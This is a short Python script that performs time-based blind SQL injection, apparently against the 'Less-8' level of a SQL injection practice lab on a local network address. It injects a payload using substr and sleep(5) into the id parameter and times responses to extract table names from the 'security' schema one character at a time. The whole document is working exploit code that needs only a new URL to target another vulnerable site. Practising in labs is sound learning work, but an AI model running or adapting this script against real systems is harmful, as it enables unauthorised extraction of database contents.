#!/usr/bin/python3

import requests, sys, time

url="http://192.168.0.101/Less-8/?id=1"

result=''
s=r'0123456789abcdefghijklmnopqrstuvwxyz'
#s=r'abcdefghijklmnopqrst'

def check(payload):
	url_new=url+payload
	time_start=time.time()
	content=requests.get(url_new)
	time_end=time.time()

	if time_end-time_start > 5:
		return 1

for j in range(1,5):
	for i in range(1, 100):
		for c in s:
			payload="' and if(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit %d,1),%d,1)='%c', sleep(5),1)-- -" %(j,i,c)

			if check(payload):
				result+=c
				print(result)
				break

#	print("\n[*] Tabla [%d]: %s") %(j,result)
	print("\n[*] Tabla [{}]: {}".format(j, result))
	result=''
